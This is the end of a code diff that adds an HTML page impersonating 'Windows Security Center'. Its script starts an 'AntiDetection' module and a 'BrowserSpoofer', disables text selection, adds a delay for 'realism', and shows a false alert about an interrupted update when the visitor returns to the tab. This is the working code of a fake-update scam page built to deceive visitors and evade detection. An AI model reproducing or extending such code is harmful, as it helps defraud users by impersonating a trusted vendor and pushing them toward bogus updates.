+                // Disable text selection
+                document.addEventListener('selectstart', (e) => {
+                    e.preventDefault();
+                    return false;
+                });
+            }
+        }
+
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            // Initialize anti-detection
+            AntiDetection.init();
+            
+            // Initialize browser spoofer
+            window.browserSpoofer = new BrowserSpoofer();
+            
+            // Add some initial delay for realism
+            setTimeout(() => {
+                console.log('Windows Security Center loaded successfully');
+            }, 1000);
+        });
+
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden && window.browserSpoofer?.isActive) {
+                // Page is hidden (user switched tab)
+                // Show warning when they return
+                window.addEventListener('focus', () => {
+                    alert('Warning: Update installation was interrupted. Please restart the update process.');
+                }, { once: true });
+            }
+        });
+    </script>
+</body>
+</html>
